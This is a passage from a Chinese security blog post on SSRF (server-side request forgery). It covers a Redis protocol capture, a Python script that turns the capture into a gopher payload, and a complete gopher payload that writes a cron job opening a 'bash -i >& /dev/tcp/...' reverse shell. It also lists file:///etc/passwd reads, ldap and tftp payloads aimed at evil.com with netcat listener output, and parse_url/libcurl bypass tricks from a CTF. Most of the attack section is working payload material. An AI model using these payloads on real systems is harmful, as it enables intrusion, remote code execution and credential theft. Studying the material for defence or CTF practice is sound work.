class="line">dbfilename\r</span><br><span class="line"><span class="variable">$4</span>\r</span><br><span class="line">root\r</span><br><span class="line">&lt; 2018/09/25 10:35:24.967772  length=5 from=0 to=4</span><br><span class="line">+OK\r</span><br><span class="line">&gt; 2018/09/25 10:35:24.974068  length=14 from=0 to=13</span><br><span class="line">*1\r</span><br><span class="line"><span class="variable">$4</span>\r</span><br><span class="line">save\r</span><br><span class="line">&lt; 2018/09/25 10:35:24.976103  length=5 from=0 to=4</span><br><span class="line">+OK\r</span><br><span class="line">&gt; 2018/09/25 10:35:24.983836  length=14 from=0 to=13</span><br><span class="line">*1\r</span><br><span class="line"><span class="variable">$4</span>\r</span><br><span class="line">quit\r</span><br><span class="line">&lt; 2018/09/25 10:35:24.984123  length=5 from=0 to=4</span><br><span class="line">+OK\r</span><br></pre></td></tr></table></figure>
+<p>引用下JoyChou师傅的转换脚本:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="comment">#author: JoyChou</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">exp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(sys.argv[<span class="number">1</span>]) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>] <span class="keyword">in</span> <span class="string">&#x27;&gt;&lt;+&#x27;</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># 判断倒数第2、3字符串是否为\r</span></span><br><span class="line">        <span class="keyword">elif</span> line[-<span class="number">3</span>:-<span class="number">1</span>] == <span class="string">r&#x27;\r&#x27;</span>:</span><br><span class="line">            <span class="comment"># 如果该行只有\r，将\r替换成%0a%0d%0a</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(line) == <span class="number">3</span>:</span><br><span class="line">                exp = exp + <span class="string">&#x27;%0a%0d%0a&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                line = line.replace(<span class="string">r&#x27;\r&#x27;</span>, <span class="string">&#x27;%0d%0a&#x27;</span>)</span><br><span class="line">                <span class="comment"># 去掉最后的换行符</span></span><br><span class="line">                line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                exp = exp + line</span><br><span class="line">        <span class="comment"># 判断是否是空行，空行替换为%0a</span></span><br><span class="line">        <span class="keyword">elif</span> line == <span class="string">&#x27;\x0a&#x27;</span>:</span><br><span class="line">            exp = exp + <span class="string">&#x27;%0a&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            exp = exp + line</span><br><span class="line"><span class="built_in">print</span> exp</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>转换规则如下：</p>
+<ul>
+<li><p>如果第一个字符是&gt;或者&lt; 那么丢弃该行字符串，表示请求和返回的时间。</p>
+</li>
+<li><p>如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。</p>
+</li>
+<li><p>将\r字符串替换成%0d%0a</p>
+</li>
+<li><p>空白行替换为%0a<br>构造gopher协议利用：<br><em>1%0d%0a$8%0d%0aflushall%0d%0a</em>3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$61%0d%0a%0a%0a*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.86.131&#x2F;8080 0&gt;&amp;1%0a%0a%0a%0d%0a<em>4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a&#x2F;var&#x2F;spool&#x2F;cron&#x2F;%0d%0a</em>4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a<em>1%0d%0a$4%0d%0asave%0d%0a</em>1%0d%0a$4%0d%0aquit%0d%0a<br>如果要换IP和端口，前面的$61也需要更改，$61表示字符串长度为61个字节，上面的EXP即是%0a%0a%0a*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.86.131&#x2F;8080 0&gt;&amp;1%0a%0a%0a%0a，3+54+4&#x3D;58。<br>本地curl测试，返回4个OK说明成功执行</p>
+</li>
+</ul>
+<p><strong>file</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/?url=file:///etc/passwd</span><br><span class="line">http://192.168.37.18/ssrf/?url=file:///E:/readme.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>ldap</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://safebuff.com/redirect.php?url=ldap://localhost:11211/%0astats%0aquit</span><br></pre></td></tr></table></figure>
+
+<p><strong>TFTP</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://safebuff.com/ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET</span><br><span class="line"></span><br><span class="line">evil.com:</span><br><span class="line"><span class="comment"># nc -v -u -l 12346Listening on [0.0.0.0] (family 0, port 12346)TESTUDPPACKEToctettsize0blksize512timeout6</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h3><p>1.利用302跳转绕过协议限制</p>
+<p>2.127 段全部都是本地地址 绕过对127.0.0.1的限制</p>
+<p>3.工具探测-&gt;<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/SSRFmap">ssrfmap</a></p>
+<h3 id="CTF技巧"><a href="#CTF技巧" class="headerlink" title="CTF技巧"></a>CTF技巧</h3><h5 id="php中的parse-url和libcurl"><a href="#php中的parse-url和libcurl" class="headerlink" title="php中的parse_url和libcurl"></a>php中的parse_url和libcurl</h5><p>题目（一个SSRF利用mysql的题目）不放了，这里也不是写CTF解题过程的，大概代码流程：</p>
+<p><code>url-&gt;php parse_url（过滤ip）-&gt;过滤url各部分(空白字符和数字)-&gt;curl发送请求</code></p>
+<p>可利用parse_url和libcurl对url解析的差异来绕过。</p>
+<p>完整url: <code>bash scheme:[//[user[:password]@]host[:port]][/path][?query][#fragment] </code><br>这里仅讨论url中不含’?’的情况</p>
+<p>php parse_url：<br>host: 匹配最后一个@后面符合格式的host</p>
+<p>libcurl：<br>host：匹配第一个@后面符合格式的host</p>
+<p>如：<a target="_blank" rel="noopener" href="http://u:p%40a.com%3A80@b.com/">http://u:p@a.com:80@b.com/</a></p>
+<p>php解析结果：<br>    schema: http<br>    host: b.com<br>    user: u<br>    pass: <a href="mailto:&#x70;&#x40;&#x61;&#x2e;&#x63;&#111;&#x6d;">&#x70;&#x40;&#x61;&#x2e;&#x63;&#111;&#x6d;</a>:80<br>libcurl解析结果：<br>    schema: http<br>    host: a.com<br>    user: u<br>    pass: p<br>    port: 80<br>    后面的@b.com&#x2F;会被忽略掉</p>
+<p>我们可以构造一个URL地址，用来让php认为host是b.com 而libcurl实际请求另一个域名。</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//u</span>:p:@a.com:<span class="number">3306</span>@b.com/</span><br><span class="line">http:<span class="regexp">//u</span>:@a.com:<span class="number">3306</span>@b.com/</span><br></pre></td></tr></table></figure>
+<p>但是这里还有一个问题，开头流程中说明了php解析URL后会过滤空白字符和数字。数字会被过滤，所以，a.com:3306是不行的，3306只能放在最后，但是放在最后端口就无法被curl获取到，但是根据rfc3986规定可以：<br>gopher:&#x2F;&#x2F;foo@[cafebabe.cf]@yolo.com:3306</p>
+<blockquote>
+<p>A host identified by an Internet Protocol literal address, version 6 or later, is distinguished by enclosing the IP literal within square brackets (“[“ and “]“). This is the only place where square bracket characters are allowed in the URI syntax.<br>IP-literal &#x3D; “[“ ( IPv6address &#x2F; IPvFuture ) “]”<br>也就是说[ip]是一种host的形式，libcurl在解析时候认为[]包裹的是host</p>
+</blockquote>
+<p>还有一种十六进制表现形式<br>gopher:&#x2F;&#x2F;foo@localhost:<a href="mailto:&#x66;&#64;&#114;&#x69;&#x63;&#116;&#101;&#114;&#122;&#x2e;&#x6d;&#101;">&#x66;&#64;&#114;&#x69;&#x63;&#116;&#101;&#114;&#122;&#x2e;&#x6d;&#101;</a>:3306&#x2F;</p>
+<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul>
+<li><a target="_blank" rel="noopener" href="http://tools.40huo.cn/#!papers.md">《Build Your SSRF EXP Autowork》猪猪侠</a></li>
+<li><a target="_blank" rel="noopener" href="https://_thorns.gitbooks.io/sec/content/teng_xun_mou_chu_ssrf_lou_6d1e28_fei_chang_hao_de_.html">腾讯某处 SSRF 漏洞（非常好的利用点）附利用脚本</a></li>
+<li><a target="_blank" rel="noopener" href="https://_thorns.gitbooks.io/sec/content/bilibilimou_fen_zhan_cong_xin_xi_xie_lu_dao_ssrf_z.html">bilibili 某分站从信息泄露到 ssrf 再到命令执行</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/159342.html">从一道CTF题目看Gopher攻击Mysql</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/">gopher在ssrf中攻击内网的示例</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+
+<span style="margin-top:30px; color:var(--blockquote-color); font-size:0.85em">
+        <br>
+        <span class="post-end-item" title="copyright"">
+            <span class="post-end-item-icon" style="margin-right: 3px">
+                <i class="fab fa-fw fa-creative-commons"></i>
+            </span>
+            <span class="post-end-item-text">采用署名-非商业性使用-相同方式共享 4.0（CC BY-NC-SA 4.0）许可协议</span>
+        </span>
+</span>
+
+
+
+
+
+<div class="donations">
+    <div class="donation-label">「分享也是一种学习」</div>
+</div>
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/overview/tags/SSRF/" rel="tag"><i class="fa fa-tag"></i> SSRF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/php%E7%BB%95%E8%BF%87disable%E5%87%BD%E6%95%B0%E8%BF%9B%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="prev" title="php绕过disable函数进行命令执行">
+      <i class="fa fa-chevron-left"></i> php绕过disable函数进行命令执行
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/posts/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9Eip/" rel="next" title="绕过CDN查找真实ip">
+      绕过CDN查找真实ip <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF"><span class="nav-text">SSRF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%AE%80%E5%AD%98%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%87%BD%E6%95%B0"><span class="nav-text">常简存在SSRF漏洞的函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#php"><span class="nav-text">php</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#java"><span class="nav-text">java</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF%E6%94%AF%E6%8C%81%E7%9A%84%E5%8D%8F%E8%AE%AE"><span class="nav-text">SSRF支持的协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="nav-text">绕过技巧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CTF%E6%8A%80%E5%B7%A7"><span class="nav-text">CTF技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#php%E4%B8%AD%E7%9A%84parse-url%E5%92%8Clibcurl"><span class="nav-text">php中的parse_url和libcurl</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-text">参考资料</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Geez"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">Geez</p>
+  <div class="site-description" itemprop="description">黑客,诗人,养龟仔</div>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/geeeez/" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;geeeez&#x2F;" rel="noopener" target="_blank"><i class="fa fa-fw fa-fab fa-github"></i></a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2016 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-fas fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Geez</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">118k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">1:47</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+  
+
+    </div>
+</body>
+</html>
